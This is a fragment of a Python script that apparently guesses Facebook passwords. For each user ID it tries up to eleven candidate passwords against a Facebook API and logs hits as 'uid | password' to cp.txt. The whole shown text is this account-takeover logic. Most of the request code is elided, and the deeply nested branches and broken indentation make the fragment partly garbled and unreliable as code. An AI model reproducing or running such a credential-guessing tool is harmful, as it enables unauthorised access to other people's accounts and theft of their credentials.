	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        print("\x1b[1;31m[Successfull] "+uid+" | "+pass1)
		        ok=open("cp.txt","a")
		        ok.write(uid+" | "+pass1+"\n")
		        ok.close()
		        oks.append(uid)
		    	...
		    	if "access_token" in d:
		            ...
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\x1b[1;31m[Successfull] "+uid+" | "+pass2)
		                ok=open("cp.txt","a")
		                ok.write(uid+" | "+pass2+"\n")
		                ok.close()
		                oks.append(uid)
		                ...
		                if 'access_token' in d:
		                    ...
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\x1b[1;31m[Successfull] "+uid+" | "+pass3)
		                        ok=open("cp.txt","a")
		                        ok.write(uid+" | "+pass3+"\n")
		                        ok.close()
		                        oks.append(uid)
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\x1b[1;31m[Successfull] "+uid+" | "+pass4)
		                                ok=open("cp.txt","a")
		                                ok.write(uid+" | "+pass4+"\n")
		                                ok.close()
		                                oks.append(uid)
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\x1b[1;31m[Successfull] "+uid+" | "+pass5)
		                                        ok=open("cp.txt","a")
		                                        ok.write(uid+" | "+pass5+"\n")
		                                        ok.close()
		                                        oks.append(uid)
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("\x1b[1;31m[Successfull] "+uid+" | "+pass6)
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\x1b[1;31m[Successfull] "+uid+" | "+pass7)
		                                                        ok=open("cp.txt","a")
		                                                        ok.write(uid+" | "+pass7+"\n")
		                                                        ok.close()
		                                                        oks.append(uid)
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            ...
		                                                            d=json.loads(q)
		                                                            if 'www.facebook.com' in d['error_msg']:
		                                                                 print("\x1b[1;31m[Successfull] "+uid+" | "+pass8)
		                                                                 ok=open("cp.txt","a")
		                                                                 ok.write(uid+" | "+pass8+"\n")
		                                                                 ok.close()
		                                                                 oks.append(uid)
		                                                                ...
		                                                                if 'access_token' in d:
		                                                                    ...
		                                                                    d=json.loads(q)
		                                                                    if 'www.facebook.com' in d['error_msg']:
		                                                                        print("\x1b[1;31m[Successfull] "+uid+" | "+pass9)
		                                                                        ok=open("cp.txt","a")
		                                                                        ok.write(uid+" | "+pass9+"\n")
		                                                                        ok.close()
		                                                                        oks.append(uid)
		                                                                        ...
		                                                                        if 'access_token' in d:
		                                                                            ...
		                                                                            d=json.loads(q)
		                                                                            if 'www.facebook.com' in d['error_msg']:
		                                                                                print("\x1b[1;31m[Successfull] "+uid+" | "+pass10)
		                                                                                ok=open("cp.txt","a")
		                                                                                ok.write(uid+" | "+pass10+"\n")
		                                                                                ok.close()
		                                                                                oks.append(uid)
		                                                                                ...
		                                                                                if 'access_token' in d:
		                                                                                    ...
		                                                                                    d=json.loads(q)
		                                                                                    if 'www.facebook.com' in d['error_msg']:
		                                                                                        print("\x1b[1;31m[Successfull] "+uid+" | "+pass11)
		                                                                                        ok=open("cp.txt","a")
		                                                                                        ok.write(uid+" | "+pass11+"\n")
		                                                                                        ok.close()
		                                                                                        oks.append(uid)
